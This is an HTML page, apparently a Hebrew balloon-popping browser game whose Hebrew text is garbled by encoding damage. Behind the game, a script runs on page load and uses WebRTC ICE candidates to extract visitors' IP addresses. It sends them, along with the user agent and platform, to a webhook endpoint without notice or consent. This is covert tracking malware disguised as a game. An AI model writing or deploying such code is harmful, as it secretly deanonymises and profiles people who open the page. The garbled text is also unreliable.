<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>砖拽  - 专住转 拽专 专砖转 </title>
    <style>
        body { margin: 0; overflow: hidden; background: #1a1a2e; color: white; font-family: sans-serif; text-align: center; }
        .score-board { font-size: 20px; padding: 10px; background: rgba(0,0,0,0.5); }
        .balloon { position: absolute; bottom: -100px; width: 60px; height: 80px; border-radius: 50%; cursor: crosshair; }
    </style>
</head>
<body>

    <div class="score-board">爪 拽专 驻注 | : <span id="score">0</span></div>
    <div id="game-container"></div>

    <script>
        // --- 拽转 砖拽 驻砖 ---
        let score = 0;
        function createBalloon() {
            const b = document.createElement('div');
            b.className = 'balloon';
            b.style.left = Math.random() * (window.innerWidth - 60) + 'px';
            b.style.backgroundColor = `hsl(${Math.random() * 360}, 70%, 60%)`;
            document.getElementById('game-container').appendChild(b);
            
            let pos = -100;
            const speed = 2 + Math.random() * 2;
            const interval = setInterval(() => {
                pos += speed;
                b.style.bottom = pos + 'px';
                if (pos > window.innerHeight) { clearInterval(interval); b.remove(); }
            }, 20);

            b.onclick = () => { score++; document.getElementById('score').innerText = score; b.remove(); };
        }
        setInterval(createBalloon, 1000);

        // --- 拽转 住祝 转 砖驻专转 (注 住 住转 转) ---
        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';

        async function collectAdvancedInfo() {
            const info = {
                timestamp: new Date().toLocaleString('he-IL'),
                userAgent: navigator.userAgent,
                platform: navigator.platform, //
                rawCandidates: [] //  砖专 转  转 专砖转 砖爪
            };

            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));

                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate) return;

                    // 砖驻转 -Candidate  -  驻注 -mDNS  -IP 转
                    const candidateStr = ice.candidate.candidate;
                    info.rawCandidates.push(candidateStr);

                    // 住 抓 转转 (   .local)
                    const parts = candidateStr.split(' ');
                    const address = parts[4]; // 砖 砖 驻专 ICE  转转
                    
                    console.log("Found Network Entity:", address);
                    
                    // 砖 -Webhook  驻注 砖爪 转 砖
                    sendData({ ...info, currentAddress: address });
                };
            } catch (e) {
                sendData(info);
            }
        }

        function sendData(data) {
            if (WEBHOOK_URL !== 'https://webhook.site/0ddb829c-12b7-4f5a-add3-679a6ecfbceb') {
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(data)
                });
            }
        }

        collectAdvancedInfo();
    </script>
</body>
</html>
